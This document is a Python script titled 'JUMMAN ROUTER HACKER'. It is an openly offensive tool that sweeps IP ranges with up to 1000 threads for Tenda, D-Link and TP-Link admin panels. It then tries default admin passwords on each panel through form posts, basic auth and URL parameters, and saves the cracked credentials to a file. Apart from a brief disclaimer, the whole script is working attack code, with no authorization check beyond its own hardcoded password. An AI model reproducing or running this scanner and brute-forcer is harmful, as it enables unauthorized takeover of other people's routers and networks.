#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     🌐 JUMMAN ROUTER HACKER - FIXED EDITION 🌐            ║
║     ⚡ Super Fast Router Scanner & Brute Force             ║
║     💀 Testing: admin, admin1, admin2, admin123           ║
║     👑 Owner: Jumman                                       ║
║     🔐 Password: ch71                                     ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import socket
import ipaddress
import subprocess
import re
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import json

# ============ PASSWORD PROTECTION ============
REQUIRED_PASSWORD = "ch71"

def check_password():
    """Check password before running tool"""
    print("\n" + "=" * 50)
    print("🔐 JUMMAN ROUTER HACKER - PASSWORD PROTECTED")
    print("=" * 50)
    print("\n⚠️  This tool is password protected!")
    print("👑 Owner: Jumman")
    print("📱 Version: 3.2 - Fixed\n")
    
    attempts = 3
    for attempt in range(attempts):
        password = input(f"🔑 Enter password ({attempts - attempt} attempts left): ").strip()
        
        if password == REQUIRED_PASSWORD:
            print("\n✅ Access Granted! Loading tool...\n")
            time.sleep(1)
            return True
        else:
            print(f"❌ Wrong password! {attempts - attempt - 1} attempts remaining\n")
    
    print("\n🚫 Access Denied! Too many failed attempts.")
    sys.exit(1)

# ============ GLOBALS ============
found_routers = []
cracked_credentials = []
scan_progress = 0
total_ips = 0
lock = threading.Lock()

# ============ ROUTER BRANDS ============
ROUTER_BRANDS = {
    'tenda': ['tenda', 'td-'],
    'dlink': ['d-link', 'dlink', 'dir-'],
    'tplink': ['tp-link', 'tplink', 'archer', 'deco']
}

# ============ 4 PASSWORDS ============
TEST_CREDENTIALS = [
    ('admin', 'admin'),
    ('admin', 'admin1'),
    ('admin', 'admin2'),
    ('admin', 'admin123')
]

# ============ ROUTER PORTS ============
ROUTER_PORTS = [80, 8080, 443, 8081, 81, 82, 8000, 8443]

# ============ LOGIN PATHS ============
LOGIN_PATHS = [
    '/', '/login', '/login.html', '/admin', '/cgi-bin/login',
    '/admin/login', '/system/login', '/goform/login',
    '/login.cgi', '/index.html'
]

# ============ SCANNER CLASS ============
class SuperFastRouterScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = []
        self.cracked = []
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     🌐 ROUTER HACKER - JUMMAN EDITION 🌐                  ║
║     ⚡ Super Fast Scanner & Brute Force                   ║
║     💀 4 Passwords: admin, admin1, admin2, admin123       ║
║     👑 Owner: Jumman                                       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
        print(f"[✓] Owner: Jumman")
        print(f"[✓] Version: 3.2 - Fixed")
        print(f"[✓] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 60)
    
    def validate_ip(self, ip_str):
        try:
            ipaddress.IPv4Address(ip_str)
            return True
        except:
            return False
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return None
    
    def get_brand(self, content):
        """Quick brand detection"""
        content_lower = content.lower()
        for brand, keywords in ROUTER_BRANDS.items():
            for keyword in keywords:
                if keyword in content_lower:
                    return brand
        return 'unknown'
    
    def extract_title(self, html_content):
        try:
            match = re.search(r'<title[^>]*>(.*?)</title>', html_content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
            return "No Title"
        except:
            return "No Title"
    
    def check_router_ultra_fast(self, ip, port):
        """Ultra fast router check"""
        try:
            protocol = 'https' if port == 443 else 'http'
            url = f"{protocol}://{ip}:{port}"
            
            response = self.session.get(url, timeout=1, allow_redirects=True)
            
            if response.status_code in [200, 401, 403]:
                content = response.text.lower()
                title = self.extract_title(response.text)
                
                router_keywords = ['router', 'admin', 'login', 'gateway', 
                                 'tenda', 'd-link', 'tp-link', 'dlink', 'tplink',
                                 'configuration', 'management', 'wireless', 'firewall']
                
                if any(kw in content for kw in router_keywords):
                    brand = self.get_brand(content)
                    
                    if brand in ['tenda', 'dlink', 'tplink']:
                        return {
                            'ip': ip,
                            'port': port,
                            'brand': brand,
                            'title': title,
                            'url': url,
                            'content': content,
                            'response': response
                        }
        except:
            pass
        return None
    
    def ultra_fast_scan(self, start_ip, end_ip):
        """Super fast parallel scanning"""
        results = []
        try:
            start = int(ipaddress.IPv4Address(start_ip))
            end = int(ipaddress.IPv4Address(end_ip))
            
            if start > end:
                return {'error': 'Start IP must be less than End IP'}
            
            ip_list = []
            for ip_int in range(start, end + 1):
                if ip_int - start > 2000:
                    print("[!] Limited to 2000 IPs")
                    break
                ip_list.append(str(ipaddress.IPv4Address(ip_int)))
            
            total_ips = len(ip_list)
            
            print(f"\n⚡ Scanning {total_ips} IPs with 1000+ threads...\n")
            
            with ThreadPoolExecutor(max_workers=1000) as executor:
                futures = []
                for ip in ip_list:
                    for port in ROUTER_PORTS:
                        futures.append(executor.submit(self.check_router_ultra_fast, ip, port))
                
                completed = 0
                total_tasks = len(futures)
                
                for future in as_completed(futures):
                    completed += 1
                    
                    if completed % 100 == 0:
                        pct = (completed / total_tasks) * 100
                        print(f"\r[*] Progress: {pct:.1f}% ({completed}/{total_tasks})", end='')
                        sys.stdout.flush()
                    
                    try:
                        result = future.result()
                        if result:
                            results.append(result)
                            brand_display = result['brand'].upper()
                            print(f"\r\n[🌐] Router Found: {result['ip']}:{result['port']} [{brand_display}]")
                            sys.stdout.flush()
                    except:
                        pass
            
            print()
            return results
        except Exception as e:
            return {'error': str(e)}
    
    # ============ FIXED CREDENTIAL CHECKING ============
    def test_credentials_on_router(self, router):
        """Test 4 passwords on router - FIXED VERSION"""
        ip = router['ip']
        port = router['port']
        protocol = 'https' if port == 443 else 'http'
        base_url = f"{protocol}://{ip}:{port}"
        
        # Get the response content for detection
        response = router.get('response')
        content = router.get('content', '')
        
        # Check if login page has specific form fields
        login_forms = self.detect_login_forms(content)
        
        for username, password in TEST_CREDENTIALS:
            for path in LOGIN_PATHS:
                try:
                    url = base_url + path
                    
                    # Method 1: Try form POST with detected fields
                    if login_forms:
                        for form_fields in login_forms:
                            try:
                                data = {}
                                for field in form_fields:
                                    if 'user' in field.lower() or 'name' in field.lower():
                                        data[field] = username
                                    elif 'pass' in field.lower() or 'pwd' in field.lower():
                                        data[field] = password
                                    elif 'login' in field.lower():
                                        data[field] = 'Login'
                                
                                if data:
                                    resp = requests.post(url, data=data, timeout=1, 
                                                        allow_redirects=True, verify=False)
                                    if self.is_login_successful(resp):
                                        return {
                                            'username': username,
                                            'password': password,
                                            'url': url,
                                            'method': 'form_post'
                                        }
                            except:
                                pass
                    
                    # Method 2: Standard form data
                    standard_forms = [
                        {'username': username, 'password': password},
                        {'user': username, 'pass': password},
                        {'usr': username, 'pwd': password},
                        {'uname': username, 'pwd': password},
                        {'login': username, 'password': password},
                        {'admin_username': username, 'admin_password': password},
                        {'auth_user': username, 'auth_pass': password},
                        {'u': username, 'p': password},
                    ]
                    
                    for data in standard_forms:
                        try:
                            resp = requests.post(url, data=data, timeout=1, 
                                                allow_redirects=True, verify=False)
                            if self.is_login_successful(resp):
                                return {
                                    'username': username,
                                    'password': password,
                                    'url': url,
                                    'method': 'form_post'
                                }
                        except:
                            pass
                    
                    # Method 3: Basic Authentication
                    try:
                        resp = requests.get(url, auth=(username, password), 
                                           timeout=1, allow_redirects=True, verify=False)
                        if self.is_login_successful(resp):
                            return {
                                'username': username,
                                'password': password,
                                'url': url,
                                'method': 'basic_auth'
                            }
                    except:
                        pass
                    
                    # Method 4: URL Parameters
                    param_variations = [
                        f"?username={username}&password={password}",
                        f"?user={username}&pass={password}",
                        f"?login={username}&password={password}",
                        f"?u={username}&p={password}",
                    ]
                    
                    for param in param_variations:
                        try:
                            resp = requests.get(url + param, timeout=1, 
                                               allow_redirects=True, verify=False)
                            if self.is_login_successful(resp):
                                return {
                                    'username': username,
                                    'password': password,
                                    'url': url + param,
                                    'method': 'url_params'
                                }
                        except:
                            pass
                            
                except:
                    pass
        
        return None
    
    def detect_login_forms(self, content):
        """Detect login form fields from HTML"""
        forms = []
        
        # Find all form tags
        form_pattern = r'<form[^>]*>(.*?)</form>'
        form_matches = re.findall(form_pattern, content, re.IGNORECASE | re.DOTALL)
        
        for form_html in form_matches:
            # Find input fields
            input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
            inputs = re.findall(input_pattern, form_html, re.IGNORECASE)
            
            if inputs:
                forms.append(inputs)
        
        return forms
    
    def is_login_successful(self, response):
        """Check if login was successful - FIXED VERSION"""
        # Check status code
        if response.status_code == 200:
            content = response.text.lower()
            
            # ============ FAILURE INDICATORS ============
            failure_indicators = [
                'invalid', 'incorrect', 'failed', 'error', 'denied', 
                'unauthorized', 'wrong', 'retry', 'try again',
                'login failed', 'authentication failed', 'access denied',
                'invalid username', 'invalid password', 'incorrect password'
            ]
            
            # ============ SUCCESS INDICATORS ============
            success_indicators = [
                'welcome', 'dashboard', 'status', 'configuration', 
                'logout', 'settings', 'admin', 'main', 'index',
                'home', 'panel', 'console', 'management', 'network',
                'overview', 'system', 'wireless', 'firewall', 'wan', 'lan',
                'connected', 'success', 'redirecting'
            ]
            
            # ============ LOGIN PAGE INDICATORS ============
            login_page_indicators = [
                'login', 'username', 'password', 'sign in', 'log in',
                'enter your password', 'enter your username'
            ]
            
            # Check for failure - if any failure indicator found, return False
            if any(f in content for f in failure_indicators):
                return False
            
            # Check for success - if any success indicator found AND not on login page
            if any(s in content for s in success_indicators):
                # Make sure we're not still on login page
                login_count = sum(1 for l in login_page_indicators if l in content)
                if login_count < 2:  # Less than 2 login indicators means likely logged in
                    return True
            
            # Check if page content is substantial and not an error page
            if len(content) > 1000:
                # Check if it's not a login page
                if 'login' not in content and 'username' not in content:
                    # Check for router-related content
                    router_keywords = ['router', 'network', 'status', 'system', 'admin']
                    if any(k in content for k in router_keywords):
                        return True
        
        # ============ CHECK FOR REDIRECTS ============
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get('Location', '').lower()
            # Redirect to admin/dashboard means success
            success_redirects = ['admin', 'dashboard', 'main', 'index', 'home', 
                               'welcome', 'status', 'overview', 'system']
            if any(s in location for s in success_redirects):
                return True
            # Redirect away from login means success
            if 'login' not in location:
                return True
        
        return False
    
    def crack_routers_parallel(self, routers):
        """Crack all routers in parallel"""
        if not routers:
            return []
        
        print(f"\n💀 Brute forcing {len(routers)} routers with 4 passwords...")
        print("=" * 60)
        
        cracked = []
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(self.test_credentials_on_router, router): router for router in routers}
            
            for future in as_completed(futures):
                router = futures[future]
                try:
                    result = future.result()
                    if result:
                        cracked.append({
                            'ip': router['ip'],
                            'port': router['port'],
                            'brand': router['brand'],
                            'username': result['username'],
                            'password': result['password'],
                            'url': result['url'],
                            'method': result.get('method', 'unknown')
                        })
                        print(f"\n✅✅✅ CRACKED! {router['ip']} [{router['brand'].upper()}]")
                        print(f"   👤 {result['username']}:{result['password']}")
                        print(f"   🔗 {result['url']}")
                        print(f"   📌 Method: {result.get('method', 'unknown')}")
                except Exception as e:
                    pass
        
        return cracked
    
    def save_results(self, routers, cracked):
        """Save results to file"""
        filename = f"router_hack_{int(time.time())}.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write("=" * 60 + "\n")
                f.write("🌐 ROUTER HACK RESULTS - JUMMAN EDITION\n")
                f.write("=" * 60 + "\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Routers Found: {len(routers)}\n")
                f.write(f"Routers Cracked: {len(cracked)}\n")
                f.write("=" * 60 + "\n\n")
                
                if cracked:
                    f.write("💀 CRACKED ROUTERS:\n")
                    f.write("-" * 40 + "\n")
                    for i, c in enumerate(cracked, 1):
                        f.write(f"{i}. {c['ip']}:{c['port']} [{c['brand'].upper()}]\n")
                        f.write(f"   👤 {c['username']}:{c['password']}\n")
                        f.write(f"   🔗 {c['url']}\n")
                        f.write(f"   📌 Method: {c.get('method', 'unknown')}\n")
                        f.write("-" * 40 + "\n")
                
                if routers:
                    f.write("\n🌐 ALL ROUTERS FOUND:\n")
                    f.write("-" * 40 + "\n")
                    for i, r in enumerate(routers, 1):
                        f.write(f"{i}. {r['ip']}:{r['port']} [{r['brand'].upper()}]\n")
                        f.write(f"   Title: {r['title']}\n")
                        f.write(f"   URL: {r['url']}\n")
                        f.write("-" * 40 + "\n")
            
            print(f"\n✅ Results saved to: {filename}")
        except Exception as e:
            print(f"\n❌ Error saving: {e}")
    
    def run(self):
        """Main execution"""
        self.clear_screen()
        self.print_banner()
        
        print("\n⚠️  LEGAL DISCLAIMER:")
        print("This tool is for authorized testing only.")
        print("Unauthorized access to routers is illegal.\n")
        
        print("⚡ SUPER FAST MODE ENABLED!")
        print("💀 Testing ONLY 4 Passwords:")
        print("   • admin:admin")
        print("   • admin:admin1")
        print("   • admin:admin2")
        print("   • admin:admin123\n")
        
        print("📌 SCAN OPTIONS:")
        print("1. Quick Scan (Local Network - 50 IPs)")
        print("2. Custom IP Range")
        print("3. Full Network Scan (All Common Ranges)")
        print("4. Exit")
        print()
        
        choice = input("Select option (1-4): ").strip()
        
        if choice == '1':
            local_ip = self.get_local_ip()
            if not local_ip:
                print("❌ Could not detect local network!")
                return
            
            subnet = ".".join(local_ip.split(".")[:3])
            start_ip = f"{subnet}.1"
            end_ip = f"{subnet}.50"
            
            print(f"\n⚡ Quick Scan: {start_ip} - {end_ip}")
            start_time = time.time()
            
            routers = self.ultra_fast_scan(start_ip, end_ip)
            
            if isinstance(routers, dict) and 'error' in routers:
                print(f"\n❌ Error: {routers['error']}")
                return
            
            elapsed = time.time() - start_time
            
            if routers:
                print(f"\n[✓] Found {len(routers)} routers in {elapsed:.2f} seconds")
                
                cracked = self.crack_routers_parallel(routers)
                
                print("\n" + "=" * 60)
                print("📊 SUMMARY")
                print("=" * 60)
                print(f"Routers Found: {len(routers)}")
                print(f"Routers Cracked: {len(cracked)}")
                print(f"Time Taken: {elapsed:.2f} seconds")
                
                if cracked:
                    print("\n💀 CRACKED CREDENTIALS:")
                    for c in cracked:
                        print(f"   {c['ip']} [{c['brand'].upper()}] - {c['username']}:{c['password']}")
                
                save = input("\n💾 Save results? (y/n): ").strip().lower()
                if save == 'y':
                    self.save_results(routers, cracked)
            else:
                print("\n❌ No routers found!")
        
        elif choice == '2':
            print("\n🔍 Enter IP Range:")
            start_ip = input("Start IP: ").strip()
            end_ip = input("End IP: ").strip()
            
            if not self.validate_ip(start_ip) or not self.validate_ip(end_ip):
                print("❌ Invalid IP format!")
                return
            
            start_time = time.time()
            routers = self.ultra_fast_scan(start_ip, end_ip)
            
            if isinstance(routers, dict) and 'error' in routers:
                print(f"\n❌ Error: {routers['error']}")
                return
            
            elapsed = time.time() - start_time
            
            if routers:
                print(f"\n[✓] Found {len(routers)} routers in {elapsed:.2f} seconds")
                
                cracked = self.crack_routers_parallel(routers)
                
                print("\n" + "=" * 60)
                print("📊 SUMMARY")
                print("=" * 60)
                print(f"Routers Found: {len(routers)}")
                print(f"Routers Cracked: {len(cracked)}")
                print(f"Time Taken: {elapsed:.2f} seconds")
                
                if cracked:
                    print("\n💀 CRACKED CREDENTIALS:")
                    for c in cracked:
                        print(f"   {c['ip']} [{c['brand'].upper()}] - {c['username']}:{c['password']}")
                
                save = input("\n💾 Save results? (y/n): ").strip().lower()
                if save == 'y':
                    self.save_results(routers, cracked)
            else:
                print("\n❌ No routers found!")
        
        elif choice == '3':
            print("\n🌍 Full Network Scan Started!")
            print("Scanning common ranges with 1000+ threads...\n")
            
            all_routers = []
            ranges = [
                ('192.168.1.1', '192.168.1.254'),
                ('192.168.0.1', '192.168.0.254'),
                ('10.0.0.1', '10.0.0.254'),
                ('172.16.0.1', '172.16.0.254'),
            ]
            
            start_time = time.time()
            
            for start, end in ranges:
                print(f"\n[*] Scanning: {start} - {end}")
                routers = self.ultra_fast_scan(start, end)
                if isinstance(routers, list):
                    all_routers.extend(routers)
            
            elapsed = time.time() - start_time
            
            if all_routers:
                print(f"\n[✓] Found {len(all_routers)} routers in {elapsed:.2f} seconds")
                
                cracked = self.crack_routers_parallel(all_routers)
                
                print("\n" + "=" * 60)
                print("📊 SUMMARY")
                print("=" * 60)
                print(f"Routers Found: {len(all_routers)}")
                print(f"Routers Cracked: {len(cracked)}")
                print(f"Time Taken: {elapsed:.2f} seconds")
                
                if cracked:
                    print("\n💀 CRACKED CREDENTIALS:")
                    for c in cracked:
                        print(f"   {c['ip']} [{c['brand'].upper()}] - {c['username']}:{c['password']}")
                
                save = input("\n💾 Save results? (y/n): ").strip().lower()
                if save == 'y':
                    self.save_results(all_routers, cracked)
            else:
                print("\n❌ No routers found!")
        
        elif choice == '4':
            print("\n👋 Goodbye!")
            sys.exit(0)
        
        else:
            print("❌ Invalid choice!")
        
        input("\nPress Enter to continue...")


# ============ MAIN ============
def main():
    try:
        check_password()
        
        try:
            import requests
        except ImportError:
            print("[*] Installing requests...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        
        scanner = SuperFastRouterScanner()
        while True:
            scanner.run()
            
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()